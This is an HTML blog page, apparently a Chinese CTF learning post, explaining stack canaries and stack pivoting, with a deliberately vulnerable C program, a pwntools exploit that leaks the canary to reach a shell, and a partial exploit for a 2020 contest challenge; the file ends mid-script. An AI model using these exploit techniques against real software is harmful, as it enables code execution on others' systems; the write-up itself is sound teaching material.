@@ -1,0 +1,811 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="google-site-verification" content="CXc5oa8hp0JI3nqiGKAoIQDPqSR7lhLCgNr11-7-XAA" />
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Ld1ng">
+
+
+
+    <meta name="description" content="Ld1ng's Blog">
+
+
+    <meta name="keywords" content="CTF,code,CUMT">
+
+
+<title>学习canary&amp;&amp;栈迁移 | Ld1ng</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="/fonts/font_oytys7w58zn/iconfont.css">
+    
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+    <script src="/js/jquery-3.7.0.min.js"></script>
+    
+
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<!-- 搜索的部分 -->
+
+
+
+    <script>
+    // function searchToggle() {
+    //     const width = $(document.body).width()
+    //     if(width > 479) {
+    //         return;
+    //     }
+    //     const search = $('.search');
+    //     const searchForm = $('.form-search')
+
+    //     if(!search.hasClass("mobile-search")) {
+    //         search.addClass("mobile-search");
+    //     } else {
+    //         search.removeClass("mobile-search");
+    //     } 
+    // }
+
+    function searchToggle() {
+        const width = $(document.body).width()
+        if(width > 479) {
+            return;
+        }
+        const search = $('.search');
+        const searchForm = $('.form-search');
+        const menuToggle = $('.menu-toggle');
+        const title = $('.navbar-header-title ');
+
+        if(!search.hasClass("mobile-search")) {
+            search.addClass("mobile-search");
+            menuToggle.addClass("open-search")
+            title.addClass("mobile-title-hidden")
+        } else {
+            search.removeClass("mobile-search");
+            menuToggle.removeClass("open-search")
+            // title.css({visibility: 'visible'})
+            title.removeClass("mobile-title-hidden")
+        } 
+    }
+
+
+
+    function search(searchInputEl, formEl, flag) {
+        const path = "/" + "search.json"; // 可以在public 下查看这个search.json
+        $(formEl).submit(function(e){
+            e.preventDefault();
+            let target = null
+            if(searchInputEl == null) {
+                const screenWidth = $(document.body).width();
+                target = screenWidth > 479 ? $('#pc-search-input') : $('#mobile-search-input');
+                console.log(target);
+            } else {
+                target = $(searchInputEl)
+            }
+
+            if(!flag && target.val() === '') {
+                return ;
+            }
+
+            $("#u-search").fadeIn(500, function() {
+                $("body > .wrapper").addClass("modal-active");
+
+                $.ajax({
+                    url: path,
+                    dataType: "json",
+                    beforeSend: function (xhr) {
+                        $input = target.val();
+                        $(".form-input").val($input);
+                        const loadingBar = $('.search-loading-bar') 
+                        loadingBar.css({
+                            width:'100%',
+                            display: 'block'
+                        });
+                    },
+                    success: function( datas ) {
+                        console.log(datas);
+                        const $resultPanel = $(".modal-body")[0];
+                        let str = `<ul class="modal-results">`;
+                        var keywords = $(".form-input").val().trim().toLowerCase().split(/[\s\-]+/);
+                        $resultPanel.innerHTML = "";
+                        let hasResult = false
+                        let text = `<div class="no-result">找不到与关键词相关的内容....</div>`;
+
+                        if ($(".form-input").val().trim().length <= 0) {
+                            // 没有结果
+                            $resultPanel.innerHTML = text;
+                            return;
+                        }
+                        datas.forEach(function (data, index) {
+                            var isMatch = true;
+                            if (!data.title || data.title.trim() === '') {
+                                data.title = "Untitled";
+                            }
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content && data.content.trim().replace(/<[^>]+>/g, "").toLowerCase() || '';
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty contents
+                            if (data_content !== '') {
+                                keywords.forEach(function (keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        hasResult = true
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            } else {
+                                isMatch = false;
+                            }
+                            // show search results
+                            if (isMatch) {
+                                str += `<li class='result-item'><a href='${data_url}' class='result-item-detail'> <span class="title">${data_title}</span>`;
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 200 characters
+                                    var start = first_occur - 40;
+                                    var end = first_occur + 160;
+
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+
+                                    if (start == 0) {
+                                        end = 200;
+                                    }
+
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+
+                                    var match_content = content.substring(start, end);
+
+                                    // highlight all keywords
+                                    keywords.forEach(function (keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, `<em class="search-keyword">${keyword}</em>`);
+                                    });
+
+                                    str += `<span class="content"> ${match_content} ...</span></a>`;
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        if(hasResult) {
+                            $resultPanel.innerHTML = str;
+                        } else {
+                            $resultPanel.innerHTML = text;
+                        }
+
+                    },
+                    complete: function() {
+                        setTimeout(() => {
+                                const loadingBar = $('.search-loading-bar') 
+                                loadingBar.css({
+                                    width:'0%',
+                                    display: 'none'
+                                });
+                        }, 300)
+                    }
+                });
+            })
+
+        });
+    }
+
+    $(document).ready(function() {
+        $('.modal-close').click(function () { 
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+
+        $('.modal-overlay').click(function() {
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+        search(null, ".form-search", false)
+        search("#u-search-modal-form .form-input", ".u-search-modal-form", true)
+    })
+</script>
+
+<meta name="generator" content="Hexo 6.0.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/"><i class="iconfont icon-home1"></i> Home</a></div>
+            <div class="menu navbar-right">
+                <!-- 这里表示的是pc端搜索框 -->
+				
+				
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="Searching" autocomplete="off" id="pc-search-input"/>
+        </form>
+    </div>
+
+				
+				
+				  
+				  
+				  <a class="menu-item" href="/archives">
+					<i class="iconfont icon-navicon-wzgl"></i>
+					Posts
+				  </a>
+				
+				  
+				  
+				  <a class="menu-item" href="/categories">
+					<i class="iconfont icon-fenlei"></i>
+					Categories
+				  </a>
+				
+				  
+				  
+				  <a class="menu-item" href="/tags">
+					<i class="iconfont icon-tag1"></i>
+					Tags
+				  </a>
+				
+				  
+				  
+				  <a class="menu-item" href="/links">
+					<i class="iconfont icon-link1"></i>
+					Links
+				  </a>
+				
+				  
+				  
+				  <a class="menu-item" href="/about">
+					<i class="iconfont icon-diandengpao"></i>
+					About
+				  </a>
+				
+				<input id="switch_default" type="checkbox" class="switch_default">
+				<label for="switch_default" class="toggleBtn"></label>
+        </div>
+    </div>
+</nav>
+
+    
+<nav class="navbar-mobile" id="nav-mobile">
+    <div class="container">
+        <div class="navbar-header">
+            <div>
+                <a href="/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+            </div>
+            <div class="navbar-mobile-right">
+                
+                
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="Searching" autocomplete="off" id="mobile-search-input"/>
+        </form>
+    </div>
+
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; 目录</div>
+            </div>
+
+        </div>
+        <div class="menu" id="mobile-menu">
+            
+            <a class="menu-item" href="/archives">Posts</a>
+            
+            <a class="menu-item" href="/categories">Categories</a>
+            
+            <a class="menu-item" href="/tags">Tags</a>
+            
+            <a class="menu-item" href="/links">Links</a>
+            
+            <a class="menu-item" href="/about">About</a>
+            
+        </div>
+    </div>
+</nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">学习canary&amp;&amp;栈迁移</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Ld1ng</a>
+                    
+					&nbsp;
+                    
+                        <span class="post-time">
+                        Date: <a href="#">July 1, 2020</a>
+                        </span>
+                    
+					&nbsp;
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/LEARNING/">LEARNING</a>
+                            
+                        </span>
+                    
+					<br>
+                     
+    <span class="post-count">
+Words:
+    <a href="">2.9k</a>  
+    </span>
+
+&nbsp;
+
+    <span class="post-count">
+Time:
+    <a href="">11min</a>  
+    </span>
+
+&nbsp;
+<span id="busuanzi_container_page_pv">
+  Views: <a href=""><span id="busuanzi_value_page_pv"></a></span></a>  
+</span>
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>刚开始接触canary，先不谈题目中如何利用，只记一下我对它浅显的理解</p>
+<hr>
+<p>2020.7.3</p>
+<p>回头看了一遍第五空间的pwn题(twice)，用了canary和栈迁移的知识，正好整合在一起</p>
+<p>学了很长时间，终于搞懂了，最近有考试，等考完详细记录一下。</p>
+<hr>
+<p>2020.7.16</p>
+<p>终于考完试复现一下这道题，中途电脑坏了拿去修，不过还好盘没坏，什么都没丢，万幸万幸~</p>
+<h1 id="0x01-canary"><a href="#0x01-canary" class="headerlink" title="0x01 canary"></a>0x01 canary</h1><p>什么是canary呢？</p>
+<p>Canary 的本意是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。 </p>
+<p>这里的canary也具有相似的功能，放在栈底用于检测是否发生栈溢出，它的出现很大程度上增加了栈溢出攻击的难度，并且由于它几乎并不消耗系统资源，所以现在成了 Linux 下保护机制的标配。</p>
+<hr>
+<h2 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h2><p>x86栈结构：</p>
+<p><img src="https://i.loli.net/2020/07/01/OPEoZQd7nupaBj8.png" alt="image-20200701172055740"></p>
+<p>主要说一下x86下的canary，x64类似</p>
+<p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。</p>
+<p>当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行 (栈溢出发生)。</p>
+<p>攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。</p>
+<h2 id="0x03-leak-canary"><a href="#0x03-leak-canary" class="headerlink" title="0x03 leak canary"></a>0x03 leak canary</h2><p>之前有个题目比较简单<a target="_blank" rel="noopener" href="http://ld1ng.com/2020/06/03/ADWorld-pwn/#0x04-Mary-Morton">Mary_Morton</a>，存在明显的格式化字符串漏洞，可以泄露canary的值</p>
+<p>这里讲一下另外一种方法</p>
+<p>为了便于理解，写一个简单的程序自己调一下</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">(<span class="keyword">void</span>)</span> </span>{</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>{</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++){</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x200</span>);</span><br><span class="line">        <span class="built_in">puts</span>(buf);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>{</span><br><span class="line">    init();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Hello Hacker!"</span>);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -no-pie canary.c -o canary //无PIE保护</span><br></pre></td></tr></tbody></table></figure>
+
+<p>编译之后可以运行，输入两次数据结束</p>
+<p>职业病，拖进IDA</p>
+<p><img src="https://i.loli.net/2020/07/01/O7kHLestKch9dTE.png" alt="image-20200701162154035"></p>
+<p>主要看一下vuln函数，<code>buf</code>是我们开辟的缓冲区，大小70H（十进制112），但是我们只定义了100个大小，为什么会多12字节的大小呢</p>
+<p>然后v3很奇怪，源码中并没有定义这个变量，看到最后return，自己和自己异或，很明显做了一次检查，只有两次相等时才能return 0，所以可以知道v3就是canary</p>
+<p>再看v3在栈中的位置<code>ebp-C</code>正好符合条件。</p>
+<p>即输入100个字符之后就是canary</p>
+<p>为了进一步搞清楚泄露canary的原理，可以gdb调试一下</p>
+<p><img src="https://i.loli.net/2020/07/01/Bx4Ld7kSaJ3EGHl.png" alt="image-20200701163648373"></p>
+<p>左面是输入了99个’A’，右面输入100个’A’，可以明显看出我画红线位置的不同，其中0x0a是100个A之后的换行符，而buf大小刚好是100</p>
+<ul>
+<li><p>当输入99个A时，加上0x0a的换行标记，正好100个字符占满buf</p>
+</li>
+<li><p>当输入100个A时，buf刚好被占满，这时0x0a的换行符覆盖掉了后四位字节的最低位（如图所示），由于32位程序中，canary为四个字节，所以0x0a覆盖掉的就是canary的最低位/x00</p>
+</li>
+</ul>
+<blockquote>
+<p>canary最低位0x00起到截断字符串的作用，在有些函数处理时，会把这个字符当做结束符，即为了防止printf、puts等函数读出它的值，所以说，如果canary真的只靠这个来防御的话，那么只需要覆盖掉0x00，便可以读取它的值</p>
+</blockquote>
+<h2 id="0x04-exp"><a href="#0x04-exp" class="headerlink" title="0x04 exp"></a>0x04 exp</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = <span class="string">'can'</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">io = process(<span class="string">'./canary'</span>)</span><br><span class="line">get_shell=ELF(<span class="string">"./canary"</span>).sym[<span class="string">"getshell"</span>]</span><br><span class="line"><span class="comment">#获得getshell的地址</span></span><br><span class="line">io.recvuntil(<span class="string">"Hello Hacker!\n"</span>)</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">100</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">"A"</span>*<span class="number">100</span>)</span><br><span class="line">Canary = u32(io.recv(<span class="number">4</span>))-<span class="number">0xa</span> <span class="comment">#继续接收后四位数据，并减掉0x0a</span></span><br><span class="line">log.info(<span class="string">"Canary:"</span>+<span class="built_in">hex</span>(Canary))</span><br><span class="line">payload = <span class="string">b"\x90"</span>*<span class="number">100</span>+p32(Canary)+<span class="string">b"\x90"</span>*<span class="number">12</span>+p32(get_shell)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://i.loli.net/2020/07/01/PiuQAro8GFBZ9W3.png" alt="image-20200701170620675"></p>
+<p>成功~</p>
+<hr>
+<h1 id="0x05-栈迁移原理"><a href="#0x05-栈迁移原理" class="headerlink" title="0x05 栈迁移原理"></a>0x05 栈迁移原理</h1><p>以32位程序举例，在使用<code>call</code>这个命令，进入一个函数的时候,程序一般情况下会进行三步栈操作:</p>
+<blockquote>
+<p>push eip+4;</p>
+<p>push ebp;</p>
+<p>mov ebp,esp;</p>
+</blockquote>
+<p>以保护现场，避免执行完函数后堆栈不平衡或者找不到之前的入口地址。</p>
+<p>在执行完函数后也会进行一系列对应的操作来还原现场<code>leave;ret;</code></p>
+<p>这边的leave就相当于进入函数栈操作的逆过程。</p>
+<blockquote>
+<p>leave  == mov esp,ebp; pop ebp;<br>ret    == pop eip #弹出栈顶数据给eip寄存器</p>
+</blockquote>
+<p>这样如果能够控制栈空间到任意地址，那么我们就能利用ret来控制eip的数据了（栈顶数据）</p>
+<h2 id="0x06-栈迁移的利用"><a href="#0x06-栈迁移的利用" class="headerlink" title="0x06 栈迁移的利用"></a>0x06 栈迁移的利用</h2><p>栈迁移一般在什么情况下利用呢？</p>
+<p>它主要是为了解决栈溢出可以，但溢出空间大小不足的问题（如read函数的字节限制等）</p>
+<p>所以我们就要通过控制ebp来绕过限制。</p>
+<p>由于<code>ret</code>返回的是栈顶数据，而栈顶地址是由esp寄存器的值决定的，也就是说如果我们控制了</p>
+<p>esp寄存器的数据，那么我们也就能够控制ret返回的栈顶数据。</p>
+<p>现在我们已经知道了 leave 能够将ebp寄存器的数据mov到esp寄存器中，然而，一开始ebp寄存</p>
+<p>器中的值并不是由我们来决定的，重点是接下来的那个<code>pop ebp</code>的操作，该操作将栈中保存的ebp</p>
+<p>数据赋值给了ebp寄存器，而我们正好能够控制该部分数据。所以利用思路便成立了。</p>
+<p>我们首先将栈中保存ebp数据的地址空间控制为我们想要栈顶地址，再利用两次<code>leave</code>操作<code>mov </code></p>
+<p><code>esp,ebp;pop ebp;mov esp,ebp;pop ebp;</code>将esp寄存器中的值变成我们想让它成为的值。由</p>
+<p>于最后还有一个<code>pop ebp</code>操作多余，该操作将导致<code>esp-4</code>，所以在构造ret的数据时应当考虑到将</p>
+<p>数据放到我们构造的esp地址-4的位置。（即栈顶留4位/8位给ebp/rbp）</p>
+<hr>
+<h2 id="0x07-2020第五空间-twice"><a href="#0x07-2020第五空间-twice" class="headerlink" title="0x07 2020第五空间 twice"></a>0x07 2020第五空间 twice</h2><p>拿2020第五空间的一道pwn题说一下</p>
+<p>只存在canary保护，拖入IDA</p>
+<p>主函数是这样的</p>
+<p><img src="https://i.loli.net/2020/07/16/mJDaQHuXNKwbv3z.png" alt="image-20200716122318894"></p>
+<p>跟进<code>sub_4007A9</code>函数</p>
+<p><img src="https://i.loli.net/2020/07/16/lfrT6CLRhGMuKSt.png" alt="image-20200716122231147"></p>
+<p>其实可以看出来，主函数初始化ncount为0，为的是将4007A9循环两次</p>
+<p>查看栈情况</p>
+<p><img src="https://i.loli.net/2020/07/16/d5gVkCaqOGmrlYA.png" alt="image-20200716122755224"></p>
+<p>输入的s之后88位就是v6，即canary</p>
+<p>再看v3，跟进40076D</p>
+<p><img src="https://i.loli.net/2020/07/16/OBTfVRevcmMw1NH.png" alt="image-20200716123046878"></p>
+<p>结合read函数，第一次可以输入89个字符，恰好可以覆盖到canary最低位，所以第一次用来泄露canary和rbp</p>
+<p>第二次可以输入112个字符，先算一下，88+8(canary)+8(saved rbp)+8(return addr)=112</p>
+<p>显然长度不够，因此第二次输入来构造栈迁移</p>
+<p>可以将新栈放在函数刚输入的位置</p>
+<p>gdb先调试一下</p>
+<p><img src="https://i.loli.net/2020/07/16/m9x6IMgld3wtPnz.png" alt="image-20200716121859353"></p>
+<p>计算出旧rbp与输入位置差0x70，因此新rbp=leak_rbp-0x70</p>
+<p>因此通过两次leave就可以完成新rbp的迁移</p>
+<h2 id="0x08-exp"><a href="#0x08-exp" class="headerlink" title="0x08 exp"></a>0x08 exp</h2><p>写了挺久的…</p>
+<p>主要是考试之前试过能跑的脚本现在不行了，libcseacher搜不到2.23的版本，不明原因，众所周知pwn是门玄学，没办法Ubuntu16的本地库做的</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">elf=ELF(<span class="string">'./pwn1'</span>)</span><br><span class="line">sh=process(<span class="string">'./pwn1'</span>)</span><br><span class="line">libc = ELF(<span class="string">"libc-2.23.so"</span>) </span><br><span class="line"><span class="comment">#本地，ubuntu16.4</span></span><br><span class="line"><span class="comment">#sh=remote("121.36.59.116",9999)</span></span><br><span class="line"></span><br><span class="line">leave_ret=<span class="number">0x0400879</span>     <span class="comment">#leave的地址</span></span><br><span class="line">pop_rdi=<span class="number">0x0400923</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.send(<span class="string">'a'</span>*<span class="number">89</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"a"</span>*<span class="number">89</span>)</span><br><span class="line">cannay=u64(sh.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">"\x00"</span>))       <span class="comment">#最后一位用\x00覆盖回去</span></span><br><span class="line">stack_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))-<span class="number">0x70</span>  <span class="comment">#旧rbp -0x70</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">"cannry: "</span>+<span class="built_in">hex</span>(cannay)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"stack_addr: "</span>+<span class="built_in">hex</span>(stack_addr)</span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">payload=flat([stack_addr+<span class="number">0x60</span>,pop_rdi,puts_got,puts_plt,<span class="number">0x0400630</span>]) </span><br><span class="line"><span class="comment">#flat模块能将pattern字符串和地址结合并且转为字节模式，</span></span><br><span class="line"><span 